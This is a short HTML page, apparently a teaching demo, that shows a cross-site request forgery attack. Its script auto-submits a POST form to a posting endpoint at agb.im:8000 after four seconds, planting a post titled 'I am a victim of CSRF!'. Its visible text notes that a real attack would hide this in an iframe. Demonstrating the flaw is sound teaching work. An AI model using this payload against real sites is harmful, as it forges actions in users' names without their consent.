<html>
	<head>
		<title>CSRF demonstration</title>
		<script type="text/javascript">
			function submit_form() {
				document.forms["myform"].submit();
			}

			setTimeout("submit_form()", 4000);
		
		</script>
	</head>
	<body>
		<h4>This form will automatically submit itself in 4 seconds. In a real CSRF attack, this would be a hidden iframe so you'd never even see it.</h4>
		<form id="myform" action="http://agb.im:8000/add_post" method="post">
		<table>
		<tr>
		  <th><label for="title">Title</label></th>
		  <td><input type="text" name="title" value="I am a victim of CSRF!"/></td>
		</tr>
		<tr>
		  <th><label for="body">Body</label></th>
		  <td><textarea name="body">I sure wish the developers of that webapp had added some basic CSRF protection.</textarea></td>
		</tr>
		<tr><td><input type="submit" name="foo" value="Post"/></td></tr>
		</table>
		</form>
	</body>
</html>
